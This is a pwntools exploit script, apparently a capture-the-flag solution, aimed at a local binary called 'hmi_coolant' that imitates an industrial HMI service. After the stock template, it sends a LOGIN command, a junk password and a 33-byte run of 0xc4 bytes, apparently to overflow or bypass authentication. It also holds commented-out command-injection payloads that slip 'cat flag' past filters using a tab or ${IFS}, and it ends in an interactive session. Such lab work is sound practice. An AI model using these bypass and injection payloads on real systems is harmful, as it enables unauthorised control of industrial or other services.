#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template hmi_coolant --host 127.0.0.1 --port 5001
from pwn import *
import time

# Set up pwntools for the correct architecture
exe = context.binary = ELF('hmi_coolant')

context.terminal = ['tmux','splitw','-h']

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 5050)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    
    if args.GDB:
        gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
        #gdb.attach(io, gdbscript=gdbscript)
    else:
        process([exe.path] + argv, *a, **kw)

    #time.sleep(1)
    context.timeout = 5

    p = remote('127.0.0.1', 5050)
    return p

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

io.recv(timeout=1)

io.sendline(b'LOGIN')
io.recv(timeout=1)

io.sendline(b'whatever')
io.recv(timeout=1)

io.sendline(b'\xc4' * 33)
io.recv(timeout=1)

#io.sendline(b'COMMAND')
#io.recv(timeout=1)
#io.sendline(b'whoami|cat\tflag')
#io.sendline(b'whoami|cat${IFS}flag')

io.interactive()
